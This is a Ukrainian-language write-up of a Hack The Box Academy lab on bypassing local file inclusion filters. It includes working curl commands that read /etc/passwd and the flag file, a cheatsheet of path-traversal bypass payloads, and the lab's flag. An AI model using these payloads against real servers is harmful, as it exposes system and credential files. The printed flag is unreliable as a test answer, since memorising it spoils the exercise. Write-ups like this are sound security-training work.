## LFI — Bypass Basic Filters: Path Traversal Obfuscation

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [Bypass Filters](https://academy.hackthebox.com/app/module/23/section/1491)
**Завдання:** Обійти фільтри та прочитати `/flag.txt`
**Прапор:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

***

## Концепція

Застосунок має **кілька фільтрів** проти LFI:
1. Блокує `../` — стандартний path traversal
2. Блокує `%2e%2e%2f` — URL-encoded `../`
3. Блокує `%252e%252e%252f` — double-encoded `../`
4. **Не блокує** `....//` — після strip `../` залишається `../`

***

## Аналіз фільтрів та чому вони падають

| Payload | Результат | Причина |
|---|---|---|
| `../../../../flag.txt` | `Illegal path specified!` | Фільтр ловить `../` |
| `%2e%2e%2f%2e%2e%2f...` | `Illegal path specified!` | Фільтр декодує і ловить `../` |
| `%252e%252e%252f...` | `Illegal path specified!` | PHP декодує двічі, фільтр ловить |
| `....//....//....//....//` | ✅ **Працює** | Фільтр видаляє `../` з середини → залишається `../` |
| `./languages/....//...` | `Illegal path specified!` | Префікс `./languages/` + `....//` не проходить з `./` |
| `languages/....//...` | ✅ **Працює** | Без `./` на початку — bypass спрацьовує |

***

## Механіка `....//` bypass

```
Вхід:    ....//....//....//....//flag.txt
Фільтр видаляє ../: ../ → ""
Результат: ../../flag.txt  ← валідний traversal
```

Фільтр шукає `../` і видаляє його, але не рекурсивно — `....//` після strip дає `../`.

***

## Робочі команди

**Тест (перевірка bypass):**
```bash
curl -s "http://TARGET_IP:PORT/index.php?language=languages/....//....//....//....//etc/passwd" | grep root
```

**Фінальний запит (прапор):**
```bash
curl -s "http://TARGET_IP:PORT/index.php?language=languages/....//....//....//....//flag.txt" | grep "HTB{"
```

> **Ключова деталь:** префікс `languages/` (без `./` на початку) — саме ця комбінація проходить обидва фільтри.

***

## LFI Filter Bypass Cheatsheet

| Техніка | Payload приклад | Обходить |
|---|---|---|
| Стандартний traversal | `../../../../etc/passwd` | Без фільтрів |
| URL encoding | `%2e%2e%2f%2e%2e%2f` | Слабкі фільтри |
| Double encoding | `%252e%252e%252f` | Фільтри що декодують один раз |
| `....//` bypass | `....//....//....//` | Фільтри що strip `../` не рекурсивно |
| Null byte | `../../../../etc/passwd%00` | PHP < 5.3 (застарілий) |
| Path normalization | `..././..././` | Деякі WAF |

***

## Прапор

```
HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
```
